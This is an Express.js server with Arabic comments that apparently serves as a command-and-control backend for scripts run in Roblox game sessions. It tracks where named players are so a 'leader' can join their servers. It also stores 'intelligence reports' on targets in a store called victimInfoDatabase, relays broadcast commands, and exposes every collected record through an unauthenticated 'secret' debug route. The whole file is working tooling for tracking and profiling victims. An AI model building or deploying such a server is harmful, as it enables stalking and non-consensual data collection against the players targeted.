const express = require('express');
const cors = require('cors');
const app = express();

// إعدادات الوصول والأمان
app.use(cors());
app.use(express.json());
app.options('*', cors());

// مخازن البيانات في الذاكرة (Memory Storage)
let activePlayers = {}; // لتتبع المتواجدين حالياً ومواقعهم (للانضمام)
let chatData = { username: "System", message: "No Command", time: Date.now() };
let victimInfoDatabase = {}; // النظام الجديد: قاعدة بيانات التقارير الجاهزة

// ==========================================
// [1] استقبال الإشارات (Ping) - تحديث الموقع والنشاط
// ==========================================
app.post('/ping', (req, res) => {
    try {
        const { username, placeId, jobId } = req.body;
        if (username) {
            activePlayers[username] = {
                placeId: placeId,
                jobId: jobId,
                lastSeen: Date.now()
            };
            // console.log(`📡 [PING] ${username} نشط.`); // تم تعطيل الكونسول لتقليل الازدحام
        }
        res.json({ status: "updated", serverTime: Date.now() });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// ==========================================
// [2] مسار الانضمام الذكي (Target Info)
// ==========================================
app.get('/target_info', (req, res) => {
    try {
        const target = req.query.username;
        const data = activePlayers[target];
        const now = Date.now();

        // فحص: هل اللاعب موجود وهل أرسل Ping خلال آخر 30 ثانية؟
        if (data && (now - data.lastSeen < 30000)) {
            console.log(`🔗 [JOIN] إرسال بيانات السيرفر للقائد للهدف: ${target}`);
            res.json({
                placeId: data.placeId,
                jobId: data.jobId,
                status: "online"
            });
        } else {
            res.status(404).json({ error: "Target offline" });
        }
    } catch (error) {
        res.status(500).json({ error: "Search failed" });
    }
});

// ==========================================
// [3] نظام التقارير الجاهزة (Info Database)
// ==========================================
app.post('/info', (req, res) => {
    try {
        const { username, data } = req.body;
        if (username && data) {
            // تحديث التقرير وحفظه بشكل دائم في الذاكرة
            victimInfoDatabase[username] = {
                ...data,
                receivedAt: Date.now(),
                updateTime: new Date().toLocaleString('ar-EG', { timeZone: 'UTC' })
            };
            console.log(`📊 [DATABASE] تم تحديث ملف الاستخبارات الجاهز لـ: ${username}`);
            res.json({ status: "success", cached: true });
        }
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

// ==========================================
// [4] جلب المعلومات الفوري (GetInfo)
// ==========================================
app.get('/getinfo', (req, res) => {
    const username = req.query.username;
    const info = victimInfoDatabase[username]; // البحث في قاعدة البيانات الجاهزة
    
    if (info) {
        console.log(`📤 [DATA] تسليم ملف جاهز لـ ${username} للقائد.`);
        res.json({ 
            status: "success", 
            isCached: true,
            data: info 
        });
        // ملاحظة: لم نعد نحذف البيانات هنا لتظل "جاهزة" دائماً
    } else {
        console.log(`❌ [NOT FOUND] لا يوجد ملف مخزن لـ ${username}`);
        res.status(404).json({ status: "not_found", message: "No data cached yet" });
    }
});

// ==========================================
// [5] التحكم والأوامر
// ==========================================
app.post('/update', (req, res) => {
    const { username, message } = req.body;
    if (username && message) {
        chatData = { username, message, time: Date.now() };
        console.log(`👑 [CMD] أمر جديد من ${username}: ${message}`);
        res.json({ status: "sent" });
    }
});

app.get('/players', (req, res) => {
    const now = Date.now();
    const onlineList = Object.keys(activePlayers)
        .filter(user => (now - activePlayers[user].lastSeen) < 20000);
    res.json(onlineList);
});

app.get('/data', (req, res) => res.json(chatData));

// ==========================================
// [6] مسار المعاينة السري (رؤية كل شيء في المتصفح)
// ==========================================
app.get('/debug_database', (req, res) => {
    res.json({
        active_sessions: Object.keys(activePlayers).length,
        cached_reports: Object.keys(victimInfoDatabase).length,
        database: victimInfoDatabase
    });
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n==========================================`);
    console.log(`🚀 704_TM ULTIMATE SERVER V5 (CACHED) READY`);
    console.log(`📡 PORT: ${PORT} | STATUS: ACTIVE`);
    console.log(`🔗 DEBUG: /debug_database`);
    console.log(`==========================================\n`);
});
